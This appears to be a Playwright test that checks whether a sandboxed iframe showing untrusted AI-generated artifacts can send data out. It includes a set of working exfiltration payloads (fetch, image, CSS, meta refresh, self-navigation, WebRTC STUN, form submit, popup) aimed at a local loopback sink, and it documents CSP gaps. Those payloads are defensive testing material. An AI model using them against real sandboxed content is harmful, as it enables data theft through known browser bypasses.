/**
 * ADR 1017 D1 / M1 — the interactive-artifact frame's egress, measured in a real
 * Chromium, not inferred from attributes.
 *
 * Why this exists: four grades called the `allow-scripts` frame "no egress" because
 * its CSP has no `connect-src`. A browser disagrees. CSP has no directive for a frame
 * navigating ITSELF, a meta refresh fires, and WebRTC ignores the CSP, so untrusted
 * model output could send what it contains to any host the moment it was opened.
 * jsdom cannot see any of that, so this spec loads the exact posture the product
 * renders (`artifactSandbox.ts`) into Chromium with a local HTTP and UDP sink:
 *  - STATIC (`sandbox=""` + `inert`, the default) must send NOTHING, including on a
 *    click or Tab+Enter over a full-frame link (the content can draw a fake "Run").
 *  - RUNNING (`allow-scripts`) DOES leak, by self-navigation, meta refresh and WebRTC.
 *    Those legs pin the premise the consent rests on (if a browser ever closes one,
 *    this goes red and the notice can be revisited).
 *  - CONTROL: every payload asserted silent under STATIC leaks once the posture is
 *    removed (no CSP meta, every sandbox token the payloads need, no `inert`), and the
 *    full-frame link is followed on a click once `inert` is gone. So a STATIC zero is
 *    the posture working, not the sink being deaf to that channel.
 * The host page is served from loopback like the sink, so a request the frame makes
 * is loopback-to-loopback and a zero cannot come from Chromium's local-network
 * restrictions on an `about:blank` embedder rather than from the posture.
 * TCP connections are counted beside HTTP requests, but that does NOT cover a bare
 * `preconnect`: measured for ADR 1021, Chromium 148 opens no preconnect socket to the
 * loopback sink even from an unsandboxed page, so the `preconnect` link in the
 * `prefetch` payload is unobserved and its zero means nothing (ADR 1017 IA67-16).
 * Not covered either: `dns-prefetch` (needs a resolver, IA67-10).
 * Sabotage (artifactSandbox.ts): `img-src *`, `default-src *`, dropping the CSP meta
 * from `buildArtifactSrcdoc`, or `allow-scripts` on the STATIC sandbox each red the
 * STATIC case; an empty RUNNING sandbox reds the RUNNING case. `inert` is applied here
 * the way `SandboxedArtifactFrame.tsx` applies it (a React component this spec cannot
 * load), so the click case's product half is held by its control, not by a probe.
 * Timing: an absence claim needs an observation window, so each mount watches for a
 * fixed 1.5 s after the frame is set; every leak the controls expect lands inside it.
 * Self-contained: no app server, no backend.
 */
import { test, expect, type Page } from '@playwright/test';
import http from 'node:http';
import dgram from 'node:dgram';
import type { AddressInfo } from 'node:net';
import { ARTIFACT_SANDBOX, ARTIFACT_SANDBOX_STATIC, buildArtifactSrcdoc } from '../src/chat/artifacts/artifactSandbox.js';

let hits: string[] = [];
let udpPackets = 0;
let tcpConnections = 0;
let httpServer: http.Server;
let hostServer: http.Server;
let udp: dgram.Socket;
let httpPort = 0;
let hostPort = 0;
let udpPort = 0;
let mounts = 0;

test.beforeAll(async () => {
  httpServer = http.createServer((req, res) => { hits.push(req.url ?? ''); res.end('ok'); });
  httpServer.on('connection', () => { tcpConnections += 1; });
  await new Promise<void>((r) => httpServer.listen(0, '127.0.0.1', () => r()));
  httpPort = (httpServer.address() as AddressInfo).port;
  // The embedding page, on its own port so its requests never reach the sink.
  hostServer = http.createServer((_req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.end('<!doctype html><html><body style="margin:0"><iframe id="f" style="width:400px;height:300px;border:0"></iframe></body></html>');
  });
  await new Promise<void>((r) => hostServer.listen(0, '127.0.0.1', () => r()));
  hostPort = (hostServer.address() as AddressInfo).port;
  udp = dgram.createSocket('udp4');
  udp.on('message', () => { udpPackets += 1; });
  await new Promise<void>((r) => udp.bind(0, '127.0.0.1', () => r()));
  udpPort = udp.address().port;
});

test.afterAll(async () => {
  await new Promise<void>((r) => httpServer.close(() => r()));
  await new Promise<void>((r) => hostServer.close(() => r()));
  udp.close();
});

const sink = (path: string): string => `http://127.0.0.1:${httpPort}/${path}?d=secret`;

const PAYLOADS = (): Record<string, string> => ({
  fetch: `<script>fetch('${sink('fetch')}').catch(()=>{})</script>`,
  img: `<img src="${sink('img')}">`,
  cssBackground: `<div style="width:10px;height:10px;background:url(${sink('css')})"></div>`,
  prefetch: `<link rel="prefetch" href="${sink('prefetch')}"><link rel="preconnect" href="${sink('preconnect')}">`,
  selfNavigation: `<script>location.href='${sink('selfnav')}'</script>`,
  metaRefresh: `<meta http-equiv="refresh" content="0;url=${sink('meta')}">`,
  webrtc: `<script>try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:${udpPort}'}]});pc.createDataChannel('x');pc.createOffer().then(o=>pc.setLocalDescription(o))}catch(e){}</script>`,
  popup: `<script>window.open('${sink('popup')}')</script>`,
  topNavigation: `<script>try{top.location='${sink('top')}'}catch(e){}</script>`,
  form: `<form action="${sink('form')}" method="get"><input name="d" value="secret"></form><script>document.forms[0].submit()</script>`,
});

interface Posture { sandbox: string; inert: boolean; doc: string }
interface Observed { hits: string[]; udpPackets: number; tcpConnections: number }
const leaked = (o: Observed): boolean => o.hits.length > 0 || o.udpPackets > 0 || o.tcpConnections > 0;

/** The frame exactly as the product renders it for the given mode. */
const product = (mode: 'static' | 'running', body: string): Posture => ({
  sandbox: mode === 'static' ? ARTIFACT_SANDBOX_STATIC : ARTIFACT_SANDBOX,
  inert: mode === 'static',
  doc: buildArtifactSrcdoc(body),
});

/** The control: no CSP meta, every token a payload needs, no `inert`. */
const unprotected = (body: string): Posture => ({
  sandbox: 'allow-scripts allow-forms allow-popups allow-top-navigation',
  inert: false,
  doc: `<!doctype html><html><head><meta charset="utf-8"></head><body>${body}</body></html>`,
});

/** Mount one frame under the posture and report what the sinks saw. The previous
 *  page is unloaded before the counters reset, so nothing late from it is counted. */
async function mount(page: Page, posture: Posture): Promise<Observed> {
  mounts += 1;
  await page.goto(`http://127.0.0.1:${hostPort}/host?n=${mounts}`);
  hits = []; udpPackets = 0; tcpConnections = 0;
  await page.evaluate(([sandbox, inert, doc]) => {
    const f = document.getElementById('f') as HTMLIFrameElement;
    f.setAttribute('sandbox', sandbox);
    if (inert) f.setAttribute('inert', '');
    f.setAttribute('referrerpolicy', 'no-referrer');
    f.srcdoc = doc;
  }, [posture.sandbox, posture.inert, posture.doc] as const);
  await page.waitForTimeout(1500);
  return { hits: [...hits], udpPackets, tcpConnections };
}

test('STATIC (the default): no channel reaches the network', async ({ page }) => {
  for (const [name, body] of Object.entries(PAYLOADS())) {
    const o = await mount(page, product('static', body));
    expect({ name, ...o }).toEqual({ name, hits: [], udpPackets: 0, tcpConnections: 0 });
  }
});

test('CONTROL: every STATIC payload leaks once the posture is removed (the sinks can see each channel)', async ({ page }) => {
  for (const [name, body] of Object.entries(PAYLOADS())) {
    expect(leaked(await mount(page, unprotected(body))), `${name}: control with no posture`).toBe(true);
  }
});

test('STATIC: a full-frame link (a fake "Run" button) sends nothing on click or Tab+Enter', async ({ page }) => {
  const link = `<a href="${sink('click')}" style="position:fixed;inset:0;display:block">Run scripts</a>`;
  await mount(page, product('static', link));
  await page.mouse.click(200, 150);
  await page.keyboard.press('Tab');
  await page.keyboard.press('Enter');
  await page.waitForTimeout(1000);
  expect(hits).toEqual([]);
  // Control: the same frame without `inert` follows the link on a click.
  await mount(page, { ...product('static', link), inert: false });
  await page.mouse.click(200, 150);
  await expect.poll(() => hits).toContain('/click?d=secret');
});

test('RUNNING: a script can still send data out (the premise the consent rests on)', async ({ page }) => {
  expect((await mount(page, product('running', PAYLOADS().selfNavigation!))).hits).toContain('/selfnav?d=secret');
  expect((await mount(page, product('running', PAYLOADS().metaRefresh!))).hits).toContain('/meta?d=secret');
  expect((await mount(page, product('running', PAYLOADS().webrtc!))).udpPackets).toBeGreaterThan(0);
});
